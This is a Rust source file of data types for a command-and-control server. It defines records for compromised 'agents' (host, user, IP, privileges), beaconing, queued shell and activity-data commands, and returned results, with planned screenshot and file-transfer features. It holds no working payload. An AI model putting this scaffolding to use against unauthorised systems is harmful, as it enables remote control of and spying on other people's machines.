use serde::{Deserialize, Serialize};
use std::collections::{HashMap, VecDeque};
use std::sync::{Arc, Mutex};

// ============================================================================
// TYPE ALIASES
// ============================================================================

/// Shared state type used across the application
/// Arc = Atomic Reference Counting (multiple owners)
/// Mutex = Mutual Exclusion (one writer at a time)
pub type SharedState = Arc<Mutex<AppState>>;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Agent {
    pub id: String,
    pub hostname: String,
    pub os: String,
    pub os_version: String,
    pub user: String,
    pub ip: String,
    pub privileges: String,
    pub version: String,
    pub last_seen: chrono::DateTime<chrono::Utc>,
    pub first_seen: chrono::DateTime<chrono::Utc>,
}

/// Command to be sent to agent
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Command {
    pub id: String,
    pub agent_id: String,
    pub command_type: CommandType,
    pub payload: String,
    pub created_at: chrono::DateTime<chrono::Utc>,
}

/// Types of commands we can send
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum CommandType {
    Shell,
    Sysinfo,
    Ping,
    GetActivityData,
    // TODO: Add more types as you implement features
    // Download,
    // Upload,
    // Screenshot,      TODO: Implement later
    // FileList,        TODO: Implement later
    // FileDownload,    TODO: Implement later
    // FileUpload,      TODO: Implement later
}

/// Result from agent after executing command
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandResult {
    pub agent_id: String,
    pub command_id: String,
    pub success: bool,
    pub output: String,
    pub timestamp: chrono::DateTime<chrono::Utc>,
}

// ============================================================================
// API REQUEST/RESPONSE MODELS
// ============================================================================

/// Agent sends this when first connecting
#[derive(Debug, Deserialize)]
pub struct RegisterRequest {
    pub agent_id: String,
    pub hostname: String,
    pub os: String,
    pub os_version: String,
    pub user: String,
    pub ip: String,
    pub privileges: String,
    pub version: String,
}

/// C2 responds to registration
#[derive(Debug, Serialize)]
pub struct RegisterResponse {
    pub success: bool,
    pub message: String,
    pub beacon_interval: u64, // seconds
}

/// Agent sends this periodically to check for commands
#[derive(Debug, Deserialize)]
pub struct BeaconRequest {
    pub agent_id: String,
}

/// C2 responds with pending commands (if any)
#[derive(Debug, Serialize)]
pub struct BeaconResponse {
    pub commands: Vec<Command>,
}

/// Agent sends command execution results
#[derive(Debug, Deserialize)]
pub struct ResultRequest {
    pub agent_id: String,
    pub command_id: String,
    pub success: bool,
    pub output: String,
}

/// C2 acknowledges receipt of result
#[derive(Debug, Serialize)]
pub struct ResultResponse {
    pub success: bool,
}

/// Request to queue a command for an agent
#[derive(Debug, Deserialize)]
pub struct QueueCommandRequest {
    pub agent_id: String,
    pub command_type: CommandType,
    pub payload: String,
}

/// Response after queuing a command
#[derive(Debug, Serialize)]
pub struct QueueCommandResponse {
    pub success: bool,
    pub command_id: String,
    pub message: String,
}

/// Response with list of all agents
#[derive(Debug, Serialize)]
pub struct ListAgentsResponse {
    pub agents: Vec<Agent>,
}

/// Response with command result
#[derive(Debug, Serialize)]
pub struct GetResultResponse {
    pub success: bool,
    pub result: Option<CommandResult>,
    pub message: String,
}

// ============================================================================
// APPLICATION STATE
// ============================================================================

/// Shared state across all handlers
pub struct AppState {
    /// All registered agents (agent_id -> Agent)
    pub agents: HashMap<String, Agent>,

    /// Command queue per agent (agent_id -> queue of commands)
    pub command_queues: HashMap<String, VecDeque<Command>>,

    /// Store results (command_id -> result)
    pub results: HashMap<String, CommandResult>,
}

impl AppState {
    pub fn new() -> Self {
        Self {
            agents: HashMap::new(),
            command_queues: HashMap::new(),
            results: HashMap::new(),
        }
    }
}
